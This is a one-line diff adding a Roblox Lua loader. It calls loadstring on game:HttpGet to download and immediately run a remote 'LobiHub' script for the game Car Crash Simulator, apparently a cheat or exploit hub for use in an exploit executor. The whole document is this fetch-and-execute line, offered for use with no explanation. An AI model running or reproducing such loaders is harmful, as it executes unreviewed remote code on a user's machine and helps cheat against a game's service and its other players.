@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/CJFabro8/LobiHub/main/Car%20Crash%20Simulator'),true))()
